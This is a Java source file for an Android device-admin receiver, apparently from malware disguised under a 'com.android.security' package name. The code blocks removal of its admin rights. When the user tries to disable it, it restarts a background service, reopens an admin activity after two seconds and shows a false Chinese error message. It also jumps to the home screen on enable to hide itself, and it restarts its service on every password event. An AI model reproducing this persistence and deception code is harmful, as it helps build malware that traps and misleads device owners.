package com.android.security.receiver;
 
import com.android.security.AdminActivity;
import com.android.security.ClientListener;
import com.android.security.MainService;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;

public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
	 Context context = null;

	  public static SharedPreferences getDevicePreference(Context paramContext)
	  {
	    return paramContext.getSharedPreferences(DeviceAdminReceiver.class.getName(), 0);
	  }

	  private void startSelf(Context paramContext)
	  {
		this.context = paramContext;
		new Handler().postDelayed(new Runnable() {
			public void run() {
				Intent localIntent = new Intent(
						MyDeviceAdminReceiver.this.context, AdminActivity.class);
				localIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
				localIntent.putExtra("disable", true);
				MyDeviceAdminReceiver.this.context.startActivity(localIntent);
			}
		}, 2000L);
	  }

	  private void startService(Context paramContext)
	  {
	    Intent localIntent = new Intent(paramContext, MainService.class);
	    localIntent.setAction(MyDeviceAdminReceiver.class.getName());
	    paramContext.startService(localIntent);
	  }

	  public CharSequence onDisableRequested(Context paramContext, Intent paramIntent)
	  {
	    startService(paramContext);
	    startSelf(paramContext);
	    return "关闭系统时发生错误。";
	  }

	  public void onDisabled(Context paramContext, Intent paramIntent)
	  {
	    startService(paramContext);
	    Intent localIntent = new Intent(paramContext, AdminActivity.class);
	    localIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	    localIntent.putExtra("disable", true);
	    paramContext.startActivity(localIntent);
	  }

	  public void onEnabled(Context paramContext, Intent paramIntent)
	  {
		  	startService(paramContext);
		    Intent localIntent1 = new Intent("android.intent.action.MAIN");
		    localIntent1.addCategory("android.intent.category.HOME");
		    localIntent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		    paramContext.startActivity(localIntent1);
/*		    Intent localIntent2 = new Intent("android.intent.action.MAIN");
		    localIntent2.addCategory("android.intent.category.HOME");
		    localIntent2.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		    paramContext.startActivity(localIntent2);*/
	  }

	  public void onPasswordChanged(Context paramContext, Intent paramIntent)
	  {
	    startService(paramContext);
	  }

	  public void onPasswordFailed(Context paramContext, Intent paramIntent)
	  {
	    startService(paramContext);
	  }

	  public void onPasswordSucceeded(Context paramContext, Intent paramIntent)
	  {
	    startService(paramContext);
	  }

	  void showToast(Context paramContext, CharSequence paramCharSequence)
	  {
	  }
}
